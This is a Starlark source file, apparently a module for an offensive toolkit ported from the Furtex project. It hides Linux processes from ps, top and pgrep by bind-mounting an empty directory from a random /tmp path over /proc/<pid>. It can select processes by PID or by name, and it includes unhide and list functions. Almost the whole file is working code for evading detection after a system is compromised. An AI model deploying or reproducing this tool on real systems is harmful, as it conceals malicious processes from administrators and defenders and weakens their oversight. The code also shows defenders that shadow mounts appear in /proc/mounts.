# linux_proc_hide - hide a PID by shadowing its /proc directory.
#
# Ported to Starlark from Furtex's edrs/proc_hide.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# A bind mount of an empty directory over /proc/<pid> hides the process from
# ps/top/pgrep while leaving it running. The shadow directory lives at an
# unguessable /tmp path; unhide recovers it from /proc/mounts, so no state
# needs to be remembered between commands. Requires CAP_SYS_ADMIN.

AT_FDCWD = -100
MS_BIND = 4096
MNT_DETACH = 2


def _is_pid(name):
    if not name:
        return False
    c = name[0]
    return c >= "0" and c <= "9"


def _mount(source, target):
    return sys_call("mount", source, target, 0, MS_BIND, 0)["errno"]


def _umount(target):
    return sys_call("umount2", target, MNT_DETACH)["errno"]


def _rand_hex(n):
    buf = sys_alloc(n)
    if buf == 0:
        return "0"
    res = sys_call("getrandom", buf, n, 0)
    if res["errno"] != 0 or res["r1"] <= 0:
        sys_free(buf)
        return "0"
    out = ""
    for i in range(n):
        out += sprintf("%02x", read_u8(buf, i))
    sys_free(buf)
    return out


def _mount_source_for(target):
    data = read_file("/proc/mounts", default="")
    for line in data.splitlines():
        fields = line.split()
        if len(fields) >= 2 and fields[1] == target:
            return fields[0]
    return ""


def _hide_pid(pid):
    target = sprintf("/proc/%s", pid)
    if not exists(target):
        print(sprintf("[!] %s not found", target))
        return "ERROR: pid not found"
    shadow = "/tmp/" + _rand_hex(8)
    mkdir(shadow)
    errno = _mount(shadow, target)
    if errno != 0:
        remove(shadow)
        print(sprintf("[!] bind mount over %s failed (errno=%d; CAP_SYS_ADMIN required)", target, errno))
        return sprintf("ERROR: errno=%d", errno)
    print(sprintf("[+] PID %s hidden; %s now shows an empty directory", pid, target))
    print(sprintf("[*] restore with: linux_proc_hide --action unhide --pid %s", pid))
    return "OK"


def _unhide_pid(pid):
    target = sprintf("/proc/%s", pid)
    source = _mount_source_for(target)
    if not source:
        print(sprintf("[!] %s is not hidden (no bind mount found)", target))
        return "ERROR: not hidden"
    errno = _umount(target)
    if errno != 0:
        print(sprintf("[!] umount %s failed (errno=%d)", target, errno))
        return sprintf("ERROR: errno=%d", errno)
    remove(source)
    print(sprintf("[+] PID %s restored in /proc", pid))
    return "OK"


def _hide_by_name(pattern):
    if not pattern:
        print("[!] name requires --name")
        return "ERROR: name required"
    hits = 0
    for pid in list_dir("/proc"):
        if not _is_pid(pid):
            continue
        comm = read_file(sprintf("/proc/%s/comm", pid), default="").strip()
        if comm and str_contains(comm, pattern):
            print(sprintf("[*] %s at PID %s", comm, pid))
            _hide_pid(pid)
            hits += 1
    if hits == 0:
        print(sprintf("[*] no process matched %s", pattern))
    return "OK"


def _list_hidden():
    data = read_file("/proc/mounts", default="")
    found = 0
    print("[*] /proc/<pid> shadow mounts:")
    for line in data.splitlines():
        fields = line.split()
        if len(fields) < 2:
            continue
        target = fields[1]
        if not str_startswith(target, "/proc/"):
            continue
        rest = target[len("/proc/"):]
        if _is_pid(rest):
            print(sprintf("  PID %s hidden (shadow %s)", rest, fields[0]))
            found += 1
    if found == 0:
        print("  (none)")
    return "OK"


def main(*args):
    action = "list"
    pid = ""
    name = ""
    if args and args[0]:
        action = str_lower(args[0].strip())
    if len(args) > 1 and args[1]:
        pid = args[1].strip()
    if len(args) > 2 and args[2]:
        name = args[2]

    if action == "hide":
        if not pid:
            print("[!] hide requires --pid")
            return "ERROR: pid required"
        return _hide_pid(pid)
    if action == "unhide":
        if not pid:
            print("[!] unhide requires --pid")
            return "ERROR: pid required"
        return _unhide_pid(pid)
    if action == "name":
        return _hide_by_name(name)
    if action == "list":
        return _list_hidden()
    print(sprintf("[!] unknown action: %s", action))
    return "ERROR: unknown action"
